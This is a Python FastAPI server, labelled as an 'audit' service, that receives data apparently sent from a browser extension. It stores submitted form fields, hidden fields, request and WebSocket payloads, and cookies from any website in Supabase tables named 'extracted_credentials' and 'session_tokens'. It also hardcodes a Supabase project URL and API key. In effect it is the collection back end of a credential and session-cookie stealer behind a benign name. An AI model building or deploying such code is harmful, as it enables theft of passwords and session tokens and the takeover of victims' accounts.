import os
import uuid
import requests
from fastapi import FastAPI, Request
import uvicorn

app = FastAPI()

# --- Supabase Config ---
SUPABASE_URL = "https://didhzagdaezinojvghpo.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRpZGh6YWdkYWV6aW5vanZnaHBvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA3ODEwMTAsImV4cCI6MjA4NjM1NzAxMH0.d8wPJ_QQdiOHv2Ch6OZTzAopZjKTRj7O1gasliKEkok"

def call_supabase(table: str, payload: dict):
    """Utility to call Supabase REST API."""
    url = f"{SUPABASE_URL}/rest/v1/{table}"
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation" # Return the inserted record
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        print(f"[Supabase Error] Table {table}: {e}")
        if hasattr(e, 'response') and e.response is not None:
             print(f"Details: {e.response.text}")
        return None

@app.post("/v1/audit")
async def audit_endpoint(request: Request):
    """Receives auditing data and distributes it across relational tables."""
    try:
        payload = await request.json()
        print(f"[Audit] Processing {payload.get('type')} for {payload.get('domain')}")

        # 1. Prepare Main Audit Record
        audit_record = {
            "capture_id": str(uuid.uuid4()),
            "timestamp": payload.get("timestamp"),
            "capture_type": payload.get("type"),
            "url": payload.get("url"),
            "domain": payload.get("domain"),
            "method": payload.get("method"),
            "tab_id": payload.get("tabId"),
            "request_id": payload.get("metadata", {}).get("requestId"),
            "captured_data": payload.get("data", {}),
            "metadata": payload.get("metadata", {}),
            "has_credentials": payload.get("metadata", {}).get("hasPassword", False),
            "is_https": payload.get("url", "").startswith("https"),
            "extension_version": request.headers.get("X-Extension-Version", "1.0")
        }

        # 2. Insert into audit_captures
        inserted = call_supabase("audit_captures", audit_record)
        if not inserted:
            return {"status": "error", "message": "Failed to create audit record"}, 500
        
        main_id = inserted[0]["id"]
        timestamp = payload.get("timestamp")
        domain = payload.get("domain")
        url = payload.get("url")
        is_https = audit_record["is_https"]

        # 3. Distribute Relational Data
        capture_type = payload.get("type")
        # Support both old 'data' and new 'sensitiveData' keys
        data = payload.get("sensitiveData") or payload.get("data", {})

        if capture_type in ["FORM_SUBMIT", "HTTP_REQUEST", "HIDDEN_FIELD", "WEBSOCKET_MESSAGE", "WEBSOCKET_RESPONSE"] and isinstance(data, dict):
            # Insert into extracted_credentials
            for field_name, info in data.items():
                # info might be a string (old) or dict {'value': ...} (new)
                field_value = info.get("value") if isinstance(info, dict) else info
                
                if field_value: # Only log non-empty fields
                    cred_record = {
                        "audit_capture_id": main_id,
                        "timestamp": timestamp,
                        "domain": domain,
                        "url": url,
                        "field_name": str(field_name),
                        "field_value": str(field_value),
                        "field_type": info.get("type") if isinstance(info, dict) else None,
                        "capture_type": capture_type,
                        "is_https": is_https
                    }
                    call_supabase("extracted_credentials", cred_record)

        elif capture_type == "HEADER_CAPTURE":
            # Extract cookies from sensitiveData if present (new structure)
            if isinstance(data, dict) and "cookies" in data:
                cookie_data = data.get("cookies")
                if isinstance(cookie_data, dict):
                    for name, info in cookie_data.items():
                        token_record = {
                            "audit_capture_id": main_id,
                            "timestamp": timestamp,
                            "domain": domain,
                            "cookie_name": name,
                            "cookie_value": info.get("value") if isinstance(info, dict) else info,
                            "is_https": is_https
                        }
                        call_supabase("session_tokens", token_record)
                
            # Fallback to old cookies string parsing
            else:
                cookie_string = payload.get("cookies", "")
                if cookie_string:
                    cookies = [c.strip() for c in cookie_string.split(";") if "=" in c]
                    for cookie in cookies:
                        name, value = cookie.split("=", 1)
                        token_record = {
                            "audit_capture_id": main_id,
                            "timestamp": timestamp,
                            "domain": domain,
                            "cookie_name": name.strip(),
                            "cookie_value": value.strip(),
                            "is_https": is_https
                        }
                        call_supabase("session_tokens", token_record)

        return {"status": "success"}

    except Exception as e:
        print(f"[Server Error] {e}")
        return {"status": "error", "message": str(e)}, 500

if __name__ == "__main__":
    print(f"Starting Relational Audit Server on port 8080...")
    uvicorn.run(app, host="0.0.0.0", port=8080)
